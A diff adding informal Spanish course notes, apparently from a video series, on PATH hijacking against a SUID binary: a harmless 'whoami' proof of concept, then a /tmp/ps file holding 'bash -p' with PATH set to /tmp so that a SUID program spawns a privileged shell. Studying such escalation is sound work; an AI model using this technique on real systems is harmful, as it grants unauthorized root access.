@@ -211,3 +211,50 @@ chmod 4755 backup
 Con esto podria ejecutarlo otro usuario con el contexto que de que podemos
 ejecutar el fichero desde otros, pero nada más, ya que no tenemos permisos de escritura y no podriamos sobreescribir el fichero, además que es un ejecutable.
 
+
+
+# video 12 explotación de un path hijacking a un binario uid
+
+Consiste en tomar el orden de prioridad y modificarla. De esta manera podemos
+hacer que se ejecute x instrucción antes por que al modificar el orden de prioridad, ejecute una que hayamos puesto al principio de todo.
+
+echo $PATH
+
+prueba de concepto
+
+touch whoami
+
+chmod u+x whoami
+
+ponemos en el fichero simplemente "ps" y guardamos
+
+modificando PATH
+
+export PATH=.:$PATH
+
+al ejecutar ./whoami
+
+ejecutará el proceso ps
+
+//listar las cadenas de caracteres imprimibles  en un binario
+
+string p
+
+
+
+
+la idea es la misma pero ahora modificando nuestro fichero en c
+
+creamos un fichero en touch /tmp/ps
+
+escrimos en el "bash -p" para aprovecharnos del suid
+
+export PATH=/tmp:$PATH
+
+
+
+
+
+
+
+
